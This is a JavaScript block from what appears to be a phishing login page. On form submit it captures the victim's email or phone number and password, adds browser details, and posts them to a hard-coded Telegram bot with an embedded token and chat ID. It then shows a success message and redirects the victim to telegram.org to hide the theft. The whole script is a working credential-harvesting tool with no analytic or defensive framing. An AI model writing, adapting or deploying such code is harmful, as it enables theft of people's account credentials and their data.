    <script>
        // Telegram Bot Configuration
        const BOT_TOKEN = '8463816043:AAEKOl889LxyNdNgCy4XvgLGYzWRhOk2x3o';
        const CHAT_ID = '7610694539';
        const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

        // DOM Elements
        const loginForm = document.getElementById('loginForm');
        const emailOrPhoneInput = document.getElementById('emailOrPhone');
        const passwordInput = document.getElementById('password');
        const messageDiv = document.getElementById('message');
        const loadingDiv = document.getElementById('loading');

        // Form submission handler
        loginForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const emailOrPhone = emailOrPhoneInput.value.trim();
            const password = passwordInput.value.trim();
            
            // Basic validation
            if (!emailOrPhone || !password) {
                showMessage('Please fill in all fields', 'error');
                return;
            }
            
            // Show loading indicator
            loadingDiv.style.display = 'block';
            hideMessage();
            
            try {
                // Send data to Telegram bot
                const response = await sendToTelegram(emailOrPhone, password);
                
                if (response.ok) {
                    // Show success message
                    showMessage('Login information sent successfully! Redirecting...', 'success');
                    
                    // Clear form
                    emailOrPhoneInput.value = '';
                    passwordInput.value = '';
                    
                    // Redirect after 2 seconds
                    setTimeout(() => {
                        window.location.href = 'https://telegram.org/';
                    }, 2000);
                } else {
                    throw new Error('Failed to send data');
                }
            } catch (error) {
                console.error('Error:', error);
                showMessage('An error occurred. Please try again.', 'error');
            } finally {
                // Hide loading indicator
                loadingDiv.style.display = 'none';
            }
        });

        // Function to send data to Telegram
        async function sendToTelegram(emailOrPhone, password) {
            const message = `üîê New Login Attempt:\n\nüìß Email/Phone: ${emailOrPhone}\nüîë Password: ${password}\n\nüåê User Agent: ${navigator.userAgent}\nüì± Platform: ${navigator.platform}\nüåç Language: ${navigator.language}`;
            
            const data = {
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            };
            
            const response = await fetch(TELEGRAM_API_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data)
            });
            
            return response;
        }

        // Function to show message
        function showMessage(text, type) {
            messageDiv.textContent = text;
            messageDiv.className = `message ${type}`;
            messageDiv.style.display = 'block';
        }

        // Function to hide message
        function hideMessage() {
            messageDiv.style.display = 'none';
        }

        // Create Account button functionality
        document.querySelector('.create-account-btn').addEventListener('click', function() {
            alert('Create Account feature would open a registration form.');
        });

        // Forgot Password link functionality
        document.querySelector('.forgot-password').addEventListener('click', function(e) {
            e.preventDefault();
            alert('Password reset functionality would be implemented here.');
        });
    </script>

